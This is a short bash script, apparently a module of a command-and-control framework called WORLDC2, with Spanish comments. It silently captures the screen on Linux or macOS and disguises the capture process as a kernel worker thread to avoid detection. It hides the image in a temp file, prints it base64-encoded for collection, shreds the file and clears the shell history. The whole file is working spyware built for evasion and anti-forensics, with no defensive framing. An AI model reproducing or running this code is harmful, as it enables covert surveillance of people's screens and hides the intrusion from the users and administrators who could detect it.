#!/bin/bash
# WORLDC2 Evasive Screenshot — Multi-platform (Linux/macOS)
# Técnicas: process masquerading, clean temp artifacts, no shell history

case "$(uname -s)" in
  Linux)
    # Intentar múltiples herramientas, ninguna deja evidencia en historial
    (exec -a "[kworker/u:0]" import -window root /tmp/.x 2>/dev/null) ||
    (exec -a "[kworker/u:1]" scrot /tmp/.x 2>/dev/null) ||
    (exec -a "[kworker/u:2]" gnome-screenshot -f /tmp/.x 2>/dev/null) ||
    (exec -a "[kworker/u:3]" xfce4-screenshooter -f -s /tmp/.x 2>/dev/null)
    ;;
  Darwin)
    screencapture -x /tmp/.x 2>/dev/null
    ;;
esac

if [ -f /tmp/.x ]; then
    base64 /tmp/.x 2>/dev/null
    shred -u /tmp/.x 2>/dev/null || rm -f /tmp/.x 2>/dev/null
else
    echo "ERROR: no screenshot tool available"
fi

# Limpiar historial
unset HISTFILE 2>/dev/null
history -c 2>/dev/null
